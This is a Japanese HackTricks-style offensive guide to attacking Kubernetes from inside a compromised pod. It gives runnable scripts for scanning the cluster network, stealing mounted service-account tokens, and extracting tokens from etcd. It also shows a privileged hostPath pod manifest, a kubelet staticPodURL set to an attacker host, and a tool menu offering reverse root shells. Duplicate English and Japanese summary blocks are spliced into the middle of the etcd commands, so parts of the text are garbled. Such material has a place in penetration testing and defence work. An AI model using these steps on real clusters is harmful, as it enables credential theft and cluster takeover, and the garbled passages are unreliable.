# Pod内からKubernetesを攻撃する

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでAWSハッキングを学ぶ**</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したいか、**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する
- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **Pod Breakout**

**運が良ければ、それからノードに脱出できるかもしれません:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### ポッドからの脱出

ポッドから脱出しようとするには、まず**特権を昇格**する必要がある場合があります。これを行うためのいくつかのテクニック：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

犯したポッドから脱出しようとするために、これらの**docker breakouts**をチェックできます:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes権限の乱用

**kubernetes enumeration**セクションで説明されているように：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常、ポッドはその中に**サービスアカウントトークン**を持って実行されます。このサービスアカウントには、他のポッドに**移動**したり、クラスタ内に構成されたノードに**脱出**したりするために**乱用できる権限**が付与されている場合があります。方法は次のとおりです:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### クラウド権限の乱用

ポッドが**クラウド環境**内で実行されている場合、**メタデータエンドポイントからトークンをリーク**してそれを使用して特権を昇格させることができるかもしれません。

## 脆弱なネットワークサービスを検索する

Kubernetes環境内にいる場合、現在のポッドの権限を乱用して特権を昇格させることができず、コンテナから脱出できない場合は、**潜在的に脆弱なサービスを検索**する必要があります。

### サービス

**この目的のために、kubernetes環境のすべてのサービスを取得しようとできます:**
```
kubectl get svc --all-namespaces
```
デフォルトでは、Kubernetesはフラットなネットワーキングスキーマを使用しており、これは**クラスタ内の任意のポッド/サービスが他のポッドと通信できることを意味します**。クラスタ内の**ネームスペース**には、**デフォルトでネットワークセキュリティ制限がありません**。ネームスペース内の誰もが他のネームスペースと通信できます。

### スキャン

以下のBashスクリプト（[Kubernetesワークショップ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)から取得）は、KubernetesクラスタのIP範囲をインストールしてスキャンします：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
### スニッフィング

**侵害されたポッドが実行されている場合**、他のポッドが認証する必要がある**機密サービス**の場合、**ローカル通信をスニッフィング**することで他のポッドから送信された資格情報を取得できるかもしれません。

## ネットワーク・スプーフィング

デフォルトでは、**ARPスプーフィング**のようなテクニック（およびそれによる**DNSスプーフィング**）はKubernetesネットワークで機能します。そのため、ポッド内で、デフォルトで存在する**NET\_RAW機能**を持っている場合、カスタム作成されたネットワークパケットを送信し、**同じノードで実行されているすべてのポッドに対してARPスプーフィングを使用したMitM攻撃を実行**できます。\
さらに、**悪意のあるポッド**が**DNSサーバーと同じノードで実行**されている場合、**クラスタ内のすべてのポッドに対してDNSスプーフィング攻撃**を実行できます。

### ノードDoS

Kubernetesマニフェストにはリソースの仕様がなく、コンテナには**適用されていない制限**があります。攻撃者として、**ポッド/デプロイメントが実行されているリソースをすべて消費**し、他のリソースを枯渇させ、環境にDoSを引き起こすことができます。

これは、[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)などのツールを使用して行うことができます。
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng`を実行している間とその後の違いがわかります
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ノードのポストエクスプロイテーション

コンテナから脱出に成功した場合、ノード内で次の興味深い情報が見つかります：

- **コンテナランタイム**プロセス（Docker）
- このノードで実行されている他の**ポッド/コンテナ**（追加のトークンなどを悪用できる）
- 全体の**ファイルシステム**および**OS**
- リスニングしている**Kube-Proxy**サービス
- リスニングしている**Kubelet**サービス。構成ファイルを確認してください：
  - ディレクトリ：`/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- その他の**Kubernetes共通ファイル**：
  - `$HOME/.kube/config` - **ユーザー構成**
  - `/etc/kubernetes/kubelet.conf`- **通常の構成**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **ブートストラップ構成**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd構成**
  - `/etc/kubernetes/pki` - **Kubernetesキー**

### ノードのkubeconfigを見つける

以前にコメントされたパスのいずれかにkubeconfigファイルが見つからない場合は、kubeletプロセスの引数`--kubeconfig`を確認してください：
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### 秘密の盗み取り
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
スクリプト[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)は、他のポッドのトークンを自動的に取得し、1つずつ確認する代わりに、探している権限を持っているかどうかをチェックします。
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特権を持つ DaemonSets

DaemonSet はクラスタのすべてのノードで実行される **pod** です。したがって、DaemonSet が **特権付きサービスアカウント** で構成されている場合、**すべてのノード** にその **特権付きサービスアカウント** の **トークン** が見つかる可能性があり、それを悪用できます。

この脆弱性は前のセクションと同じですが、今度は運に左右されません。

### クラウドへのピボット

クラスタがクラウドサービスによって管理されている場合、通常、**ノードはポッドとは異なるアクセス** 権をメタデータエンドポイントに持っています。したがって、**ノードからメタデータエンドポイントにアクセス** を試みてください（または hostNetwork が True のポッドから）:

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcd を盗む

コンテナを実行するノードの [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) を指定できる場合は、コントロールプレーンノード内でシェルを取得し、**etcd データベース** を取得します。
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane ノードには **role master** があり、**クラウド管理されたクラスタではそれらで何も実行できない**。

#### etcd からシークレットを読み取る

ポッドのスペックで `nodeName` セレクタを使用して control-plane ノード上でポッドを実行できる場合、`etcd` データベースに簡単にアクセスできるかもしれません。このデータベースには、クラスタの構成全体、つまりすべてのシークレットが含まれています。

以下は、`etcd` からシークレットを取得するクイックで汚い方法です。これは、お使いの control-plane ノードで `etcd` が実行されている場合に使用できます。`etcdctl` という `etcd` クライアントユーティリティを使用してポッドを起動し、どこで実行されているかに関係なく `etcd` に接続するために control-plane ノードの資格情報を使用するよりエレガントなソリューションが必要な場合は、@mauilion の [この例のマニフェスト](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) をチェックしてください。

**control-plane ノードで `etcd` が実行されているかどうかを確認し、データベースがどこにあるかを確認します（これは `kubeadm` で作成されたクラスタです）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

In a Kubernetes cluster, if an attacker gains access to a pod, they can perform various attacks to escalate privileges and move laterally within the cluster. Some common techniques include:

1. **Pod to Node**: An attacker can use the pod to access the underlying node and potentially compromise other pods running on the same node.

2. **Pod to Cluster**: By exploiting misconfigurations or vulnerabilities, an attacker can escalate privileges to gain control over the entire cluster.

To prevent such attacks, it is crucial to follow security best practices such as:

- Implementing network policies to restrict pod-to-pod communication.
- Using RBAC to limit pod permissions within the cluster.
- Regularly updating Kubernetes and its components to patch known vulnerabilities.
```
```html
## ポッド内からKubernetesを攻撃する

Kubernetesクラスターでは、攻撃者がポッドにアクセス権を取得すると、特権を昇格させ、クラスター内で横断移動するためのさまざまな攻撃を実行できます。一般的な技術には次のものがあります。

1. **ポッドからノードへ**: 攻撃者はポッドを使用して基礎となるノードにアクセスし、同じノードで実行されている他のポッドを侵害する可能性があります。

2. **ポッドからクラスターへ**: 設定ミスや脆弱性を悪用することで、攻撃者は特権を昇格させてクラスター全体を制御することができます。

このような攻撃を防ぐためには、次のセキュリティベストプラクティスに従うことが重要です。

- ポッド間通信を制限するためのネットワークポリシーの実装。
- クラスター内でのポッドの権限を制限するためのRBACの使用。
- 既知の脆弱性を修正するために、定期的にKubernetesおよびそのコンポーネントを更新する。
```
```bash
data-dir=/var/lib/etcd
```
**etcdデータベース内のデータを表示します:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**データベースからトークンを抽出し、サービスアカウント名を表示します**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**同じコマンドですが、いくつかのgrepsを使用して、kube-systemネームスペース内のデフォルトトークンのみを返すようにします**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

In a Kubernetes cluster, if an attacker gains access to a pod, they can perform various attacks to escalate privileges and move laterally within the cluster. Some common techniques include:

1. **Accessing the Kubernetes API**: An attacker can access the Kubernetes API from inside a compromised pod, allowing them to gather information about the cluster and potentially perform malicious actions.

2. **Mounting Host Paths**: By mounting host paths into a pod, an attacker can access sensitive host resources such as configuration files or other pods running on the same node.

3. **Exploiting Service Accounts**: If a pod has overly permissive service account permissions, an attacker can abuse these permissions to interact with the Kubernetes API and potentially take control of the cluster.

4. **Pod Escape**: In some cases, it may be possible for an attacker to break out of the pod's container and gain access to the underlying node, allowing for further attacks on the cluster.

To mitigate these risks, it is essential to follow security best practices such as restricting pod permissions, implementing network policies, and regularly auditing and monitoring pod activities.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### 静的/ミラーポッドの永続性

_静的ポッド_ は、API サーバーが監視していない特定のノード上で kubelet デーモンによって直接管理されます。コントロール プレーンによって管理されるポッド（たとえば、Deployment）とは異なり、**kubelet は各静的ポッドを監視**し（失敗した場合は再起動します）。

したがって、静的ポッドは常に特定のノード上の **1 つの Kubelet にバインド**されています。

**kubelet は、各静的ポッドに対して Kubernetes API サーバー上にミラーポッドを作成**しようとします。これにより、ノード上で実行されているポッドは API サーバー上で表示されますが、そこから制御することはできません。ポッド名は、ノードのホスト名に先行するハイフンで接尾辞が付きます。

{% hint style="danger" %}
静的ポッドの **`spec` は他の API オブジェクトを参照できません**（たとえば、ServiceAccount、ConfigMap、Secret など）。そのため、現在のノードで任意の serviceAccount を使用してポッドを起動するためにこの動作を悪用することはできません。ただし、これを使用して異なる名前空間でポッドを実行することはできます（何らかの理由でそれが役立つ場合）。
{% endhint %}

ノードホスト内にいる場合、**自分自身内に静的ポッドを作成**することができます。これはかなり便利です。なぜなら、**kube-system** のような異なる名前空間にポッドを作成できる可能性があるからです。

静的ポッドを作成するには、[**ドキュメントが大いに役立ちます**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。基本的には 2 つのことが必要です：

* **kubelet サービス**または **kubelet 構成**（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）でパラメータ **`--pod-manifest-path=/etc/kubernetes/manifests`** を構成し、サービスを再起動します
* **`/etc/kubernetes/manifests`** 内の **ポッド定義** で定義を作成します

**もう 1 つのより潜在的な方法は次のとおりです：**

* **kubelet** 構成ファイルからパラメータ **`staticPodURL`** を変更し、`staticPodURL: http://attacker.com:8765/pod.yaml` のようなものに設定します。これにより、kubelet プロセスが指定された URL から **構成を取得して静的ポッドを作成**します。

**例**：[**ここ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/) から取得した **kube-system** 内の特権ポッドを作成する **ポッド** 構成の例:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ポッドの削除 + スケジュール不可能なノード

攻撃者が**ノードを侵害**し、他のノードから**ポッドを削除**し、**他のノードがポッドを実行できないように**する場合、ポッドは侵害されたノードで再実行され、彼はそれらで実行されるトークンを**盗むことができます**。\
詳細については、[**このリンク**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)を参照してください。

## 自動ツール

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubリポジトリに提出してください。**

</details>
